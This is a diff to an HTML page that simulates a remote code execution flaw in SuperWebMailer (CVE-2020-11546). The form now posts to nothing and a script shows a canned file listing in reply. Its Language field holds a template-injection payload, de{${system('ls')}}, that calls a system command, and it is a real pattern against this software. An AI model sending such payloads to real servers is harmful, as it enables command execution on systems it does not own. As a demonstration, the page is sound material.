@@ -30,13 +30,13 @@
   <h1>SuperWebMailer Remote Code Execution Simulation (CVE-2020-11546)</h1>
   <p>This is a demonstration of a fake RCE vulnerability simulation. The request will not actually execute any system commands, but it shows how an attacker could exploit the vulnerability in <strong>SuperWebMailer</strong>.</p>
 
-  <form action="https://vladlevin.site/fake_endpoint" method="POST">
+  <form id="exploitForm">
     <label for="language">Language:</label>
     <input type="text" id="language" name="Language" value="de{${system('ls')}}"><br><br>
     <input type="submit" value="Submit">
   </form>
 
-  <div class="response">
+  <div class="response" id="response">
     <h3>Simulated Response</h3>
     <p>If the vulnerability was present, the following result would be shown on the page:</p>
     <pre>ajax_ccea.php
@@ -47,6 +47,23 @@ ajax_getemailtemplates.php</pre>
   <div class="alert">
     <strong>Warning:</strong> This is a simulated attack. No actual code is executed on the server.
   </div>
+
+  <script>
+    // JavaScript to handle form submission and simulate vulnerability
+    document.getElementById("exploitForm").addEventListener("submit", function(event) {
+      event.preventDefault();
+      
+      var language = document.getElementById("language").value;
+      if (language.includes("${system('ls')}")) {
+        document.getElementById("response").innerHTML = `
+          <h3>Simulated Response</h3>
+          <pre>ajax_ccea.php
+ajax_getemailingactions.php
+ajax_getemailtemplates.php</pre>
+        `;
+      }
+    });
+  </script>
 
 </body>
 </html>
